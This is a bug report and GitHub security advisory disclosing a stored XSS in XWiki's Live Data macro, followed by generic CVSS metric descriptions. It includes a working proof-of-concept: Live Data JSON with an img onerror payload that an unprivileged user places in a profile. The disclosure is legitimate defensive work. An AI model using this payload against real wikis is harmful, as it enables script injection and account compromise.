#### Description

**Steps to reproduce:**

1. As a user without script rights, add the following content to the about section of your user profile:
   ```
   {{liveData id="movies" properties="title,description"}}
   {
     "data": {
       "count": 1,
       "entries": [
         {
           "title": "Meet John Doe",
           "url": "https://www.imdb.com/title/tt0033891/",
           "description": "<img onerror='alert(1)' src='foo' />"
         }
       ]
     },
     "meta": {
       "propertyDescriptors": [
         {
           "id": "title",
           "name": "Title",
           "visible": true,
           "displayer": {"id": "link", "propertyHref": "url"}
         },
         {
           "id": "description",
           "name": "Description",
           "visible": true,
           "displayer": "html"
         }
       ]
     }
   }
   {{/liveData}}

   ```
2. Save the user profile.

**Expected result:**

No alert is displayed.

**Actual result:**

An alert with content "1" is displayed.

This demonstrates XSS (and in general, arbitrary HTML injection) with an unprivileged user account. Similar results can probably be achieved with the Livetable data source by changing a column that is normally displayed with the text displayer to use the HTML displayer and then adding the HTML code to the text content.

This is probably reproducible in all versions of XWiki that include the Live Data macro. Note that while Livetable might allow similar attacks, Livetable requires script rights and thus cannot be used by users without script rights.

published
GHSA-32fq-m2q5-h83g
Mar 1, 2023

## Package

## Description

### Impact

A user without script rights can introduce a stored XSS by using the Live Data macro.

For instance:

```
{{liveData id="movies" properties="title,description"}}
{
  "data": {
    "count": 1,
    "entries": [
      {
        "title": "Meet John Doe",
        "url": "https://www.imdb.com/title/tt0033891/",
        "description": "<img onerror='alert(1)' src='foo' />"
      }
    ]
  },
  "meta": {
    "propertyDescriptors": [
      {
        "id": "title",
        "name": "Title",
        "visible": true,
        "displayer": {"id": "link", "propertyHref": "url"}
      },
      {
        "id": "description",
        "name": "Description",
        "visible": true,
        "displayer": "html"
      }
    ]
  }
}
{{/liveData}}

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
